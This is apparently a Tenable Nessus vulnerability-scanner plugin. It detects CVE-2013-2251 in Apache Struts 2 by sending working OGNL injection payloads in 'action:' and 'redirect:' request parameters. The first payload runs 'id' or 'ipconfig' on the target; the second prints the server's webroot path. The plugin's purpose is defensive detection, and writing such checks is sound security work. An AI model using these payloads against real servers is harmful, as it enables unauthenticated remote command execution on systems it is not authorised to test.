#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(68981);
  script_version("$Revision: 1.18 $");
  script_cvs_date("$Date: 2017/01/30 19:28:01 $");

  script_cve_id("CVE-2013-2251");
  script_bugtraq_id(61189);
  script_osvdb_id(95405);

  script_name(english:"Apache Struts 2 'action:' Parameter Arbitrary Remote Command Execution");
  script_summary(english:"Attempts to execute arbitrary commands.");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a web application that uses a Java
framework, which is affected by a remote command execution
vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote web application appears to use Struts 2, a web framework
that utilizes OGNL (Object-Graph Navigation Language) as an expression
language. Due to a flaw in the evaluation of an OGNL expression
prefixed by the 'action:' parameter, a remote, unauthenticated
attacker can exploit this issue to execute arbitrary commands on the
remote web server. An attacker can exploit the issue by sending a
specially crafted HTTP request to the remote web server.

Note that the 'redirect:' and 'redirectAction' parameters are also
reportedly affected by the command execution vulnerability.
Additionally, this version of Struts 2 is also reportedly affected by
an open redirect vulnerability; however, Nessus has not tested for
this additional issue.

Note also that this plugin will only report the first vulnerable
instance of a Struts 2 application.

Finally, note that Apache Archiva versions prior to and equal to
1.3.6 are also affected by this issue as the application utilizes a
vulnerable version of Struts 2."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/527977/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://cxsecurity.com/issue/WLB-2014010087");
  script_set_attribute(attribute:"see_also", value:"http://struts.apache.org/docs/s2-016.html");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 2.3.15.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Apache-Struts DefaultActionMapper < 2.3.15.1 RCE Linux");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Apache Struts 2 DefaultActionMapper Prefixes OGNL Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'D2ExploitPack');

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/07/16");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/07/16");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/07/19");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:struts");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2017 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "webmirror.nasl",  "os_fingerprint.nasl");
  script_require_ports("Services/www", 80, 8080);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");

port = get_http_port(default:8080);
cgis = get_kb_list('www/' + port + '/cgi');

urls = make_list();
# To identify actions that we can test the exploit on we will look
# for files with the .action / .jsp / .do suffix from the KB.
if (!isnull(cgis))
{
  foreach cgi (cgis)
  {
    match = eregmatch(pattern:"((^.*)(/.+\.act(ion)?)($|\?|;))", string:cgi);
    if (match)
    {
      urls = make_list(urls, match[0]);
      if (!thorough_tests) break;
    }
    match2 = eregmatch(pattern:"(^.*)(/.+\.jsp)$", string:cgi);
    if (!isnull(match2))
    {
      urls = make_list(urls, match2[0]);
      if (!thorough_tests) break;
    }
    match3 = eregmatch(pattern:"(^.*)(/.+\.do)$", string:cgi);
    if (!isnull(match3))
    {
      urls = make_list(urls, match3[0]);
      if (!thorough_tests) break;
    }
  }
}
if (thorough_tests)
{
  cgi2 = get_kb_list('www/' + port + '/content/extensions/act*');
  if (!isnull(cgi2)) urls = make_list(urls, cgi2);

  cgi3 = get_kb_list('www/' + port + '/content/extensions/jsp');
  if (!isnull(cgi3)) urls = make_list(urls, cgi3);

  cgi4 = get_kb_list('www/' + port + '/content/extensions/do');
  if (!isnull(cgi4)) urls = make_list(urls, cgi4);
}

if (max_index(urls) == 0)
  audit(AUDIT_WEB_FILES_NOT, "Struts 2 .action / .do / .jsp", port);

urls = list_uniq(urls);

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig');

vuln = FALSE;

foreach url (urls)
{
  foreach cmd (cmds)
  {
    vuln_url = url + "?action:%25{(new+java.lang.ProcessBuilder(new" +
      "+java.lang.String[]{'" +cmd+ "'})).start()}";

    res = http_send_recv3(
      method : "GET",
      port   : port,
      item   : vuln_url,
      fetch404     : TRUE,
      exit_on_fail : TRUE
    );

    if (
       res[0] =~ "404 Not Found" &&
       res[2] =~ "\<b\>message\</b\> \<u\>(.*)/java\.lang\." +
         "(UNIX)?Process(Impl)?@(.+)\.jsp\</u\>"
    )
    {
      vuln = TRUE;
      break;
    }
  }
  # Stop after first vulnerable Struts app is found
  if (vuln) break;
}

# Alternate attack that does not rely on 404 Error Page from Tomcat/JBoss
# This attack uses the redirect: Parameter
if (!vuln)
{
  time = unixtime();
  foreach url (urls)
  {
    vuln_url = url +"?redirect:${%23req%3d%23context.get('com.opensymphony" +
      ".xwork2.dispatcher.HttpServletRequest'),%23webroot%3d%23req.get" +
      "Session().getServletContext().getRealPath('/'),%23resp%3d%23context." +
      "get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')." +
      "getWriter(),%23resp.print('At%20" +time+ "%20Nessus%20found%20the" +
      "%20path%20is%20'),%23resp.println(%23webroot),%23resp.flush()," +
      "%23resp.close()}";

    res = http_send_recv3(
      method : "GET",
      port   : port,
      item   : vuln_url,
      exit_on_fail : TRUE
    );

    if (
       (res[0] =~ "200 OK") &&
       (res[2] =~ '^At '+time+' Nessus found the path is ([a-zA-Z]:\\\\|/)(.*)')
    )
    {
      vuln = TRUE;
      break;
    }
    if (vuln) break;
  }
}

if (!vuln) exit(0, 'No vulnerable applications were detected on the web server listening on port '+port+'.');

security_report_v4(
  port       : port,
  severity   : SECURITY_HOLE,
  generic    : TRUE,
  request    : make_list(build_url(qs:vuln_url, port:port)),
  output     : chomp(res[2])
);
